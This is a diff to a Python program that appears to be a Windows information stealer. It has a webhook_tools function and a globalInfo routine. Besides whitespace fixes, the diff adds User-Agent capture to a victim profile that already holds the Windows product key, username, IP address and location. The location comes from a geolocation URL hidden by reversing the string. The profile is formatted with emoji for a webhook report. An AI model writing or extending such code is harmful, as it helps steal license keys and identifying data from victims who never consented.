@@ -7,11 +7,11 @@ from shutil import copy
 import sqlite3
 from base64 import b64decode
 import winreg
-import zipfile 
-from zipfile import ZipFile 
+import zipfile
+from zipfile import ZipFile
 import shutil
 import tempfile
-from sys import executable, stderr 
+from sys import executable, stderr
 from ctypes import * 
 from json import loads, dumps, load, dump
 from pathlib import Path
@@ -215,7 +215,7 @@ def webhook_tools():
 
             print('Press any key to quit')
         else:
-            print('Wrong input') 
+            print('Wrong input')
             time.sleep(1)
     except:
         pass
@@ -612,6 +612,10 @@ def globalInfo():
     winkey = get_product_key()
     url = 'nosj/oi.ofnipi//:sptth'[::-1]
     req = requests.get(url)
+    try:
+        user_agent = req.headers['User-Agent']
+    except:
+        user_agent = "Coudln't get User-Agent"
     data = req.json()
     ip = data['ip']
     loc = data['loc']
@@ -671,8 +675,9 @@ def globalInfo():
 
     globalinfo = f"""
     :flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`
-    \nProduct name : {pr}
-    \nComputer language : `{language}`
+    \n User-Agent : {user_agent}
+    \n Product name : {pr}
+    \n Computer language : `{language}`
     \n Windows Key `{winkey}`
     \n More Information 👀 : 
     \n :flag_{country_code}: - `({region}) ({postal})`
